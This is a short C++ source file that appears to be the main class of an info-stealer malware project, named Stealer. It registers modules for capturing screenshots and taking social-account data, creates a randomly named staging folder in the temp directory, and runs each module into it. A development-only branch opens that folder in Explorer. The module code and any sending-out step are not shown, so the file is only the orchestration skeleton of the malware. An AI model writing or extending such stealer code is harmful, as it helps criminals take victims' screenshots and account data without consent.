//
// Created by .1qxz on 06.06.2024.
//

#include "Stealer.h"
#include "impl/Screenshot.h"
#include "impl/socials/Socials.h"
#include <thread>

void Stealer::registerModules() {
    this->modules.push_back(new Screenshot());
    this->modules.push_back(new Socials());
}


Stealer::Stealer() {
    this->registerModules();

    this->root_dir = Utils::getTemp() / Utils::generateString(10);
    fs::create_directory(this->root_dir);

#if DEV
    std::string cmd = "explorer.exe " + this->root_dir.string();
    std::system(cmd.c_str());
#endif
}

void Stealer::run() {
    for(StealerImpl* module : this->modules)
    {
        module->execute(this->root_dir);
    }
}